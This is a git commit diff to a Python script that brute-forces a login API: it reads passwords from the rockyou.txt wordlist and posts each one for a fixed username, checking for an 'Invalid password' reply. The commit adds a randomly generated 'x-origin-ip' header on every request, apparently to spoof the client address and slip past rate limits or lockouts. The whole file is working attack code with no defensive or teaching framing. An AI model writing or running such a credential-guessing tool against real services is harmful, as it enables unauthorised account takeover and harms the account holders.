39884bc30e40bc46b456c5ad2d937ae5106aa51b
Madhukrishna24 <122712563+Madhukrishna24@users.noreply.github.com>
2024-12-27 10:47:50 +0530

    random header

--- main.py
+++ main.py
@@ -1,12 +1,16 @@
 import requests
 from dotenv import load_dotenv
 import os
+import random
 
 load_dotenv()
 
 url = os.getenv("API_URL")
 username = os.getenv("USERNAME")
-headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
+
+# Generate a random IP address
+def generate_random_ip():
+    return ".".join(str(random.randint(0, 255)) for _ in range(4))
 
 with open("./rockyou.txt", "r", encoding="latin-1") as passwords:
     passwds = passwords.readlines()
@@ -14,7 +18,26 @@ with open("./rockyou.txt", "r", encoding="latin-1") as passwords:
 i = 0
 for passwd in passwds:
     passwd = passwd.strip()
-    res = requests.post(url, data={"username": username, "password": passwd, "deviceType": "browser", "clientName": "Chrome", "os": "Windows", "osVersion": "10.0", "tokenType": "WEB"}, headers=headers)
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+        'x-origin-ip': generate_random_ip()
+    }
+    
+    res = requests.post(
+        url, 
+        data={
+            "username": username,
+            "password": passwd, 
+            "deviceType": "browser", 
+            "clientName": "Chrome", 
+            "os": "Windows", 
+            "osVersion": "10.0", 
+            "tokenType": "WEB"
+        }, 
+        headers=headers
+    )
+    
     res_json = res.json()
     
     if res_json["message"] != "Invalid password":
